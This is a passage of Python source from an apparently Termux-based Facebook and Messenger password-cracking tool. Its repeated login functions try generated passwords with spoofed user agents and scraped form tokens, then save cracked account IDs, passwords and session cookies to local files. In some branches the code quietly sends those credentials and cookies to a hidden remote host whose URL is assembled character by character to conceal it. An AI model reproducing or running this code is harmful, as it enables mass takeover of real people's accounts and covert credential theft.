            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            session.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                        break
            elif "checkpoint" in res:
                xd=session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        



def host_facebookXXX(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        fb=mas.domain_random(qw)
        session=requests.session()
        for pw in pwx:
            ua=mas.user_samsung_iphone()
            ps=number_pas(uid,pw)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = session.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            session.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            elif "checkpoint" in res:
                xd=session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)


def host_facebookXXXX(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        fb=mas.domain_random(qw)
        session=requests.session()
        for pw in pwx:
            ua=mas.windows_user_agent()
            ps=number_pas(uid,pw)
            pwd="#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)
            free_fb = session.get(f"https://{fb}/").text
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'fb38dc8c5b219383a470b24dbf7e70188f42ff640ee5621e432acde7dd94b4f5',}
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '8',
            '__hs': '20343.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1027045623',
            '__s': 'wko2jq:1dmgeu:5pooei',
            '__hsi': '7549198049858549816',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfuXi0WRcoXzIDjxZyILh4-ueXFN0Ayv5XMAQQ76yO_Qm25ta1SlZg:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"w1xkvz:63\\",\\"password_text_input_id\\":\\"w1xkvz:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"193816396700338\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+uid+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': f'{fb}',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/ig/login_via/app/?lid=0KgCUNyg2GQxQqkNV&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQHxMVXP4nZPstzbam3xy5Q3yCZNmDwKmyykJl0240%2FVdD6kQxampPUGMDPzNt5v%2Fy1KK%2B9QeRZ%2B7ys63%2BDvp2AxtqetI2MKFcnjFMXIyogR70ky3rTxEIu3PMhYuxX4JL%2BxDQ%3D%3D',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua}
            session.post(f'https://{fb}/async/wbloks/fetch/', params=params, headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            elif "checkpoint" in res:
                xd=session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                cpp.append(xd)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(xd+"|"+ps+"\n")
                open(cp_today,"a").write(xd+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+xd+"&ps="+ps+f"&types={optionname}&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def Linux_ua():
    major_version = random.randint(100, 140)
    build1 = random.randint(4000, 7000)
    build2 = random.randint(10, 150)
    ua = (
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        f"(KHTML, like Gecko) Chrome/{major_version}.{build1}.{build2} Safari/537.36")
    return ua





def host_messanger(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': Linux_ua(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        




def host_messanger_android(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': mas.MXuseragent(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def host_messanger_android_2(uid,pwx,tl,qw):
    global oks,loop,koki,lock,hostua,apkshower,profitoks,cpp
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    try:
        session=requests.session()
        p = session.get('https://www.messenger.com/')
        datr = re.search('_js_datr","(.*?)",', str(p.text)).group(1)
        headers = {
        'authority': 'www.messenger.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.messenger.com',
        'referer': 'https://www.messenger.com/',
        'Cookie':f'wd=980x1715; dpr=2; _js_datr={datr}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': mas.redmi_user_agent(),}
        for pw in pwx:
            ps=number_pas(uid,pw)
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'initial_request_id': re.search('name="initial_request_id" value="(.*?)"', str(p.text)).group(1),
            'timezone': '-360',
            'lgndim': re.search('name="lgndim" value="(.*?)"', str(p.text)).group(1),
            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(p.text)).group(1),
            'lgnjs': 'n',
            'email': uid,
            'pass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'default_persistent': '',}
            session.post('https://www.messenger.com/login/password/', headers=headers, data=data)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                        if "send" in myprofit(profitoks):
                            requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+xd+"&ps="+ps+"&coki="+coki)
                            profitoks.append(xd)
                        else:
                            console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {xd} {dot(xd)} {ps}\n\r[💥] {coki}\n")
                            open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(xd+"|"+ps+"|"+coki+"\n") 
                            open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(xd+"|"+ps+"\n")
                            oks.append(xd)
                            profitoks.append(xd)
                            id_token="not_have"
                            live_ck('RND',qw,xd,ps,coki,id_token,pw)
                    break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        




def host_messanger_iphone(uid,pwx,tl,qw):
